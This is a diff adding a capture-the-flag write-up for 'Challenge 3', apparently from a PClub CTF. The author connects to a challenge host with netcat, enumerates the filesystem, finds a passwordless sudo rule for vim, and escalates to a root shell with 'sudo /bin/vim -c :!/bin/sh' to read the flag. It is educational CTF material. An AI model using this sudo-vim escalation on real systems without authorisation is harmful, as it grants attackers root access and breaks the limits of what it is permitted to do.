@@ -149,3 +149,114 @@ $ read line <&3
 echo "$line"
 $ PClub{4lw4ys_cl05e_y0ur_fil3s}
 ```
+
+
+
+
+### Challenge 3
+
+Challenge - ```13.235.21.137:4729``` 
+
+**FLAG:** ```PClub{y0u_ar3_in_7he_sudoers_th1s_1nc1d3nt_will_n0t_be_rep0r7ed} ```
+
+First comnect with netcat:
+``` nc 13.235.21.137 4729``` 
+
+It gave:
+```
+/bin/sh: 0: can't access tty; job control turned off 
+```
+Did:
+```
+$ whoami
+ctf
+$ id
+uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
+```
+So I'm a low privilage user.  
+Then to see the file system , did:
+```
+$ ls 
+$ cd .. 
+$ ls
+bin chal etc lib media opt root sbin sys usr boot dev home lib64 mnt proc run srv tmp var 
+``` 
+
+Then tried to list the important directories i saw:
+```
+$ ls /chal
+ls /home 
+ls /root
+$ ubuntu 
+$ ls: cannot open directory '/root':Permission denied 
+```
+So root can't be accessed.
+Then tried to read common challenge locations:
+```
+$cat /chal/* 
+cat /home/*/* 
+
+$ cat: '/chal/*': No such file or directory 
+$ cat: '/home/*/*': No such file or directory
+``` 
+
+To find any file with "flag" in its name, used:```find / -name '*flag*' 2>/dev/null```
+```
+$ find / -name '*flag*' 2>/dev/null 
+/proc/sys/kernel/acpi_video_flags 
+/proc/sys/net/ipv4/fib_notify_on_flag_change 
+/proc/sys/net/ipv6/fib_notify_on_flag_change 
+/proc/kpageflags 
+/sys/devices/pnp0/00:06/00:06:0/00:06:0.0/tty/ttyS0/flags 
+/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags 
+/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags 
+/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags 
+/sys/devices/virtual/net/lo/flags /sys/devices/virtual/net/eth0/flags 
+/sys/hypervisor/start_flags 
+/sys/module/scsi_mod/parameters/default_dev_flags 
+/tmp/recovered_flag.txt 
+/tmp/flag.swp 
+```
+I tried some sudo command but got error that Permission denied so decided to check privilages of sudo:
+```
+$ sudo -l 
+Matching Defaults entries for ctf on 1d6089cf076a: 
+        env_reset, mail_badpass,
+secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+        use_pty 
+
+User ctf may run the following commands on 1d6089cf076a:
+         (ALL) NOPASSWD: /bin/vim 
+```
+So now as we can use ```sudo/bin/vim``` we can escalate our privilages and get the root access through vim.
+Then did:
+```
+$ sudo /bin/vim -c ':!/bin/sh' 
+E558:  Terminal entry not found in terminfo 'unknown' not known. Available builtin terminals are: 
+
+builtin_ansi
+builtin_vt320
+builtin_vt52
+builtin_xterm
+builtin_iris-ansi
+builtin_pcansi
+builtin_win32
+builtin_amiga
+builtin_dumb
+builtin_debug
+defaulting to 'ansi' 
+
+```
+Vim was opened ,tried to get the root access: 
+
+```
+:!/bin/sh 
+/bin/sh: 0: can't access tty; job control turned off 
+# whoami
+root 
+# ls /root 
+cat /root/* flag
+# PClub{y0u_ar3_in_7he_sudoers_th1s_1nc1d3nt_will_n0t_be_rep0r7ed} 
+# 
+```
+Got the flag.
